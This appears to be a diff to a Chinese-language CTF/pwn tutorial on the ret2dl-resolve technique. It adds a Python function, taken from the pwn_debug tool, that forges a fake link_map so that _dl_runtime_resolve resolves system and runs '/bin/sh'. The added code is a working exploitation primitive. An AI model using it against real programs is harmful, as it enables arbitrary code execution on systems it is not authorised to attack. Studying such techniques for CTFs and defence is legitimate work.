@@ -473,6 +473,33 @@ fake_link_map=dl.build_link_map(fake_addr,reloc_index,offset,got_libc_address)
 
 最后利用的时候，我们要将生成的`fake_link_map`数据写入`fake_addr`地址处，还将要程序link_map_got表(got+4)中的`link_map`地址写成`fake_addr`地址，最后跳去plt表的`push reloc`指令地址处执行,之前要构造好参数，最后进入`dl_runtime_resolve`函数，根据link_map解析到调用函数，getshell.
 
+把pwn_debug里面的`fake_link_map`功能函数抠出来，可单独使用，`reloc_index`默认设置为0，脚本如下：
+
+```python
+offset = libc.sym['system'] - libc.sym['__libc_start_main']
+ 
+def fake_link_map_gen(link_map_addr,l_addr,st_value):
+    fake_Elf64_Dyn_JMPREL_addr = link_map_addr + 0x18
+    fake_Elf64_Dyn_SYM_addr = link_map_addr + 8
+    fake_Elf64_Dyn_STR_addr = link_map_addr
+    fake_Elf64_Dyn_JMPREL = p64(0) + p64(link_map_addr+0x28)
+    fake_Elf64_Dyn_SYM = p64(0) + p64(st_value-8)
+    fake_Elf64_rela = p64(link_map_addr - l_addr) + p64(7) + p64(0)
+ 
+    fake_link_map = p64(l_addr)            #0x8
+    fake_link_map += fake_Elf64_Dyn_SYM    #0x10
+    fake_link_map += fake_Elf64_Dyn_JMPREL #0x10
+    fake_link_map += fake_Elf64_rela       #0x18
+    fake_link_map += '\x00'*0x28
+    fake_link_map += p64(fake_Elf64_Dyn_STR_addr) #link_map_addr + 0x68
+    fake_link_map += p64(fake_Elf64_Dyn_SYM_addr) #link_map_addr + 0x70
+    fake_link_map += '/bin/sh\x00'.ljust(0x80,'\x00')
+    fake_link_map += p64(fake_Elf64_Dyn_JMPREL_addr)
+    return fake_link_map
+
+fake_link_map = fake_link_map_gen(link_map_addr,offset,elf.got['__libc_start_main'])
+
+```
 
 
 ## Related Links
